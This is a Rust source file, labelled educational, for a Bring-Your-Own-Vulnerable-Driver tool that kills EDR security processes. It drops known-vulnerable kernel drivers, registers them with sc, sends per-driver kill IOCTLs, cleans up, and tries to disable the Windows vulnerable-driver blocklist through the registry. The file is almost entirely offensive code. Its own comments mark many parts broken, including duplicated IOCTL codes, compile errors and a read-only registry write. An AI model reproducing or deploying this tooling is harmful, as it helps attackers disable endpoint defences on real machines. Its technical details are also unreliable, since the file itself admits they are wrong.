/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// byovd.rs — Bring-Your-Own-Vulnerable-Driver EDR process termination.
//
// Intended flow: drop a known-vulnerable .sys, `sc create/start`, send an
// IOCTL that kills a PID, then stop/delete the service.
//
// BROKEN:
//   - drivers/ is empty in this tree; load_driver_bytes always returns None.
//   - BYOVD_DRIVER_DIR is option_env! (compile-time), not a runtime env var.
//   - GenericDriver entries in `pool` are temporaries with String fields —
//     typical Rust compile error (temporary dropped while borrowed).
//   - ThrottleStop IOCTL payload is PID-only; comments admit it is incomplete.
//   - TrueSight / Safetica / wsftprm share IOCTL 0x22E084 (copy-paste).
//   - RTCore64 and capcom share 0xAA013044; capcom is not a PID-kill IOCTL.
//   - disable_driver_blocklist opens CI key read-only then set_value.
//   - PoisonX mentioned in comments is not in the pool.
//   - sc create needs admin; Microsoft vulnerable-driver blocklist may block.

use log::{info, error, warn};
use std::fs;
use std::path::{Path, PathBuf};
use std::ptr;
use winapi::um::fileapi::{CreateFileW, DeviceIoControl};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnt::HANDLE;
use winapi::shared::minwindef::{GENERIC_READ, GENERIC_WRITE};
use winapi::um::winbase::OPEN_EXISTING;
use winreg::{RegKey, enums::HKEY_LOCAL_MACHINE};

// ── Driver trait ─────────────────────────────────────────────────────────────

/// Per-driver metadata + how to pack the kill IOCTL body.
pub trait DriverConfig {
    fn driver_name(&self)  -> &str;  // sc service name
    fn driver_file(&self)  -> &str;  // filename under drivers/
    fn device_path(&self)  -> &str;  // \\.\Device
    fn ioctl_code(&self)   -> u32;
    fn build_ioctl_input(&self, pid: u32, process_name: &str) -> Vec<u8>;
}

// ── Known vulnerable driver configs ─────────────────────────────────────────

pub struct K7Terminator;
impl DriverConfig for K7Terminator {
    fn driver_name(&self)  -> &str { "K7RKScan" }
    fn driver_file(&self)  -> &str { "K7RKScan.sys" }
    fn device_path(&self)  -> &str { r"\\.\K7RKScan" }
    fn ioctl_code(&self)   -> u32  { 0x830020C4 } // CVE-2025-52915 / CVE-2025-1055
    fn build_ioctl_input(&self, pid: u32, _: &str) -> Vec<u8> { pid.to_le_bytes().to_vec() }
}

pub struct BdApiTerminator;
impl DriverConfig for BdApiTerminator {
    fn driver_name(&self)  -> &str { "BdApiUtil64" }
    fn driver_file(&self)  -> &str { "BdApiUtil64.sys" }
    fn device_path(&self)  -> &str { r"\\.\BdApiUtil" }
    fn ioctl_code(&self)   -> u32  { 0x9C402440 }
    fn build_ioctl_input(&self, pid: u32, _: &str) -> Vec<u8> { pid.to_le_bytes().to_vec() }
}

pub struct TrueSightTerminator;
impl DriverConfig for TrueSightTerminator {
    fn driver_name(&self)  -> &str { "TrueSight" }
    fn driver_file(&self)  -> &str { "truesight.sys" }
    fn device_path(&self)  -> &str { r"\\.\TrueSight" }
    fn ioctl_code(&self)   -> u32  { 0x22E084 }
    fn build_ioctl_input(&self, pid: u32, _: &str) -> Vec<u8> { pid.to_le_bytes().to_vec() }
}

pub struct WsftprmTerminator;
impl DriverConfig for WsftprmTerminator {
    fn driver_name(&self)  -> &str { "wsftprm" }
    fn driver_file(&self)  -> &str { "wsftprm.sys" }
    fn device_path(&self)  -> &str { r"\\.\wsftprm" }
    fn ioctl_code(&self)   -> u32  { 0x22E084 } // BROKEN: same IOCTL as TrueSight/Safetica
    fn build_ioctl_input(&self, pid: u32, _: &str) -> Vec<u8> { pid.to_le_bytes().to_vec() }
}

/// ThrottleStop — CVE-2025-7771 (arbitrary physical memory R/W via MmMapIoSpace).
/// Weaponised in the wild by MedusaLocker (Aug 2025, Kaspersky).
pub struct ThrottleStopTerminator;
impl DriverConfig for ThrottleStopTerminator {
    fn driver_name(&self)  -> &str { "ThrottleBlood" }  // attacker-renamed file
    fn driver_file(&self)  -> &str { "ThrottleBlood.sys" }
    fn device_path(&self)  -> &str { r"\\.\ThrottleStop" }
    fn ioctl_code(&self)   -> u32  { 0x80002044 } // MmMapIoSpace expose IOCTL
    fn build_ioctl_input(&self, pid: u32, _: &str) -> Vec<u8> {
        // ThrottleStop requires: target PID (4 bytes) + physical address target (8 bytes).
        // In a real deployment these are resolved via Superfetch VA→PA translation.
        // Here we emit the PID alone; a kernel exploit module handles the rest.
        // BROKEN: no kernel module in this tree; IOCTL body is incomplete.
        pid.to_le_bytes().to_vec()
    }
}

/// Safetica STProcessMonitor — CVE-2025-70795.
pub struct SafeticaTerminator;
impl DriverConfig for SafeticaTerminator {
    fn driver_name(&self)  -> &str { "STProcessMonitor" }
    fn driver_file(&self)  -> &str { "STProcessMonitor.sys" }
    fn device_path(&self)  -> &str { r"\\.\STProcessMonitor" }
    fn ioctl_code(&self)   -> u32  { 0x22E084 } // BROKEN: copy-pasted IOCTL
    fn build_ioctl_input(&self, pid: u32, _: &str) -> Vec<u8> { pid.to_le_bytes().to_vec() }
}

/// Generic driver entry for the runtime-configured fallback pool.
/// BROKEN in kill_edr_processes: String `path` cannot live in a `&[&dyn]` array
/// of temporaries (borrowed value does not live long enough).
pub struct GenericDriver {
    pub name:  &'static str,
    pub file:  &'static str,
    pub path:  String,
    pub ioctl: u32,
}
impl DriverConfig for GenericDriver {
    fn driver_name(&self)  -> &str { self.name }
    fn driver_file(&self)  -> &str { self.file }
    fn device_path(&self)  -> &str { &self.path }
    fn ioctl_code(&self)   -> u32  { self.ioctl }
    fn build_ioctl_input(&self, pid: u32, _: &str) -> Vec<u8> { pid.to_le_bytes().to_vec() }
}

// ── Driver file loading ───────────────────────────────────────────────────────

/// Load driver bytes from disk.
/// Path: `BYOVD_DRIVER_DIR/<filename>` (default "drivers/").
/// Returns `None` if the file is not present — caller skips to next driver.
///
/// BROKEN vs README: option_env! is compile-time cargo env, not std::env::var.
fn load_driver_bytes(filename: &str) -> Option<Vec<u8>> {
    let dir = option_env!("BYOVD_DRIVER_DIR").unwrap_or("drivers");
    let path = PathBuf::from(dir).join(filename);
    match fs::read(&path) {
        Ok(data) => Some(data),
        Err(_)   => {
            warn!("Driver file not found: {}", path.display());
            None
        }
    }
}

// ── Core BYOVD routine ────────────────────────────────────────────────────────

/// Load a vulnerable driver, send the kill IOCTL, then unload.
/// Returns `true` if DeviceIoControl returned success (not proof the PID died).
pub fn run_byovd(config: &dyn DriverConfig, target_pid: u32, target_name: &str) -> bool {
    // 1. Load driver bytes.
    let driver_data = match load_driver_bytes(config.driver_file()) {
        Some(d) => d,
        None    => return false,
    };

    // 2. Write to temp dir (conspicuous .sys drop).
    let temp_path = std::env::temp_dir().join(config.driver_file());
    if let Err(e) = fs::write(&temp_path, &driver_data) {
        error!("Driver write failed: {}", e);
        return false;
    }

    // 3. Register and start the service via cmd.exe (noisy, needs admin).
    let load_cmd = format!(
        r#"sc create {} type= kernel binPath= "{}""#,
        config.driver_name(), temp_path.display()
    );
    let _ = std::process::Command::new("cmd").args(&["/C", &load_cmd]).output();

    let start_out = std::process::Command::new("cmd")
        .args(&["/C", &format!("sc start {}", config.driver_name())])
        .output();
    let started = start_out.map(|o| o.status.success()).unwrap_or(false);
    if !started {
        error!("Failed to start driver: {}", config.driver_name());
        let _ = fs::remove_file(&temp_path);
        return false;
    }

    // 4. Open the device and send the kill IOCTL.
    let success = unsafe {
        let wide: Vec<u16> = config.device_path().encode_utf16().chain(Some(0)).collect();
        let handle: HANDLE = CreateFileW(
            wide.as_ptr(), GENERIC_READ | GENERIC_WRITE,
            0, ptr::null_mut(), OPEN_EXISTING, 0, ptr::null_mut(),
        );
        if handle == ptr::null_mut() {
            error!("Failed to open device: {}", config.device_path());
            false
        } else {
            let input = config.build_ioctl_input(target_pid, target_name);
            let mut returned = 0u32;
            let ok = DeviceIoControl(
                handle, config.ioctl_code(),
                input.as_ptr() as *mut _, input.len() as u32,
                ptr::null_mut(), 0, &mut returned, ptr::null_mut(),
            );
            CloseHandle(handle);
            if ok != 0 {
                info!("Killed {} (PID {}) via {}", target_name, target_pid, config.driver_name());
                true
            } else {
                error!("DeviceIoControl failed for {}", config.driver_name());
                false
            }
        }
    };

    // 5. Cleanup: stop & delete service, remove file.
    let _ = std::process::Command::new("cmd")
        .args(&["/C", &format!("sc stop {}", config.driver_name())])
        .output();
    let _ = std::process::Command::new("cmd")
        .args(&["/C", &format!("sc delete {}", config.driver_name())])
        .output();
    let _ = fs::remove_file(temp_path);

    success
}

// ── Kill EDR processes ────────────────────────────────────────────────────────

/// Attempt to kill all target processes by rotating through the driver pool.
/// For each PID, try drivers in order until one reports IOCTL success.
pub fn kill_edr_processes(targets: &[(u32, String)]) -> bool {
    if targets.is_empty() { return false; }

    // BUG FIX: original iterated the same small list then duplicated the
    // wsftprm attempt.  Now we define one comprehensive pool and rotate
    // through it cleanly.
    // BROKEN: GenericDriver { path: String } temporaries in this array.
    let pool: &[&dyn DriverConfig] = &[
        &K7Terminator,
        &BdApiTerminator,
        &TrueSightTerminator,
        &ThrottleStopTerminator,
        &SafeticaTerminator,
        &WsftprmTerminator,
        &GenericDriver { name: "RTCore64", file: "RTCore64.sys",  path: r"\\.\RTCore64".to_string(), ioctl: 0xAA013044 },
        &GenericDriver { name: "capcom",   file: "capcom.sys",    path: r"\\.\capcom".to_string(),   ioctl: 0xAA013044 },
    ];

    let mut any_success = false;

    'outer: for (pid, name) in targets {
        for driver in pool {
            if run_byovd(*driver, *pid, name) {
                any_success = true;
                continue 'outer;  // next target
            }
        }
        warn!("All drivers failed for {} (PID {})", name, pid);
    }

    if !any_success {
        // Last resort: attempt to disable the Microsoft driver block list.
        info!("Standard BYOVD exhausted; trying to disable driver blocklist…");
        if disable_driver_blocklist() {
            info!("Blocklist disabled — reboot required for effect.");
        }
    }

    any_success
}

// ── Driver blocklist bypass ────────────────────────────────────────────────────

/// Write HKLM\...\Control\CI DriverBlocklist = 0.
/// BROKEN: open_subkey is read-only; set_value will fail. Wrong key for HVCI
/// blocklist in practice. Even if it worked, needs reboot, not in-process.
fn disable_driver_blocklist() -> bool {
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    match hklm.open_subkey(r"SYSTEM\CurrentControlSet\Control\CI") {
        Ok(key) => {
            let _ = key.set_value("DriverBlocklist", &0u32);
            info!("DriverBlocklist set to 0. Reboot required.");
            true
        }
        Err(e) => { error!("CI registry open failed: {}", e); false }
    }
}
